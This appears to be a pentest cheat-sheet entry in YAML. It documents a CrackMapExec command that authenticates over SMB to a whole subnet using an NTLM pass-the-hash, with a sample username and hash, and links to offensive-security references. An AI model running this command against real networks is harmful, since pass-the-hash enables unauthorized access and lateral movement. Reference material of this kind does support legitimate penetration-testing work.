---
description: Use CrackMapExec to perform SMB authentication with NTLM Pass-the-Hash against a subnet, enumerating SMB shares or verifying credentials.

Command Reference:
    Target IP: 10.10.10.1/24
    Domain: N/A
    Username: john
    Hash: 580B16D486D8D2CAFA00B314D41FA396 (NTLM hash)

command: |
  crackmapexec smb 10.10.10.1/24 -u john -H 00000000000000000000000000000000:580B16D486D8D2CAFA00B314D41FA396

items:
  - Hash

services:
  - SMB
  - NTLM

OS:
  - Windows

attack_types:
  - Enumeration

references:
  - https://github.com/byt3bl33d3r/CrackMapExec
  - https://www.ired.team/offensive-security/lateral-movement/using-crackmapexec
---
